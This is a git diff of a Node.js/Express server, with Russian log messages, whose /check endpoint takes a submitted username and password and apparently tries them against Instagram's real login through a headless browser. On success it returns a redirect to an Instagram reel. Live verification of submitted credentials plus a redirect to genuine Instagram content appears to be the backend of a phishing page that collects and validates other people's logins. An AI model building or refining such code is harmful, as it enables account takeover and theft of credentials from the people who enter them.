@@ -30,15 +30,11 @@ app.post("/check", async (req, res) => {
     
     const { username, password } = req.body;
 
-    if (!username || !password) {
-        console.log("Ошибка: пустые поля!");
-        return res.status(400).json({ error: "Заполните все поля!" });
-    }
-
+    // Проверка валидации
     const validation = validateCredentials(username, password);
     if (!validation.valid) {
         console.log("Ошибка валидации:", validation.message);
-        return res.status(400).json({ error: validation.message });
+        return res.json({ error: true, message: validation.message });
     }
 
     console.log(`Начинаем проверку логина для пользователя: ${username}`);
@@ -69,20 +65,21 @@ app.post("/check", async (req, res) => {
             }
         }
 
+        await browser.close();
+
         if (loginSuccess) {
             console.log(`Пользователь ${username} успешно вошел в аккаунт.`);
-            await browser.close();
-            return res.json({ success: true, message: "Успешный вход в Instagram" });
+            return res.json({ error: false, message: "Успешный вход в Instagram", redirectUrl: "https://www.instagram.com/reel/DGZvsOutpww/?igsh=MWozYjZtbWhyeHZvaA==" });
         } else {
             console.log("Ошибка входа: URL не изменился.");
-            await browser.close();
-            return res.status(401).json({ success: false, message: "Неверный логин или пароль" });
+            return res.json({ error: true, message: "Неверный логин или пароль" });
         }
+        
 
     } catch (error) {
         console.error("Ошибка при входе в Instagram:", error);
         await browser.close();
-        return res.status(500).json({ error: "Ошибка сервера" });
+        return res.json({ error: true, message: "Ошибка сервера" });
     }
 });
 
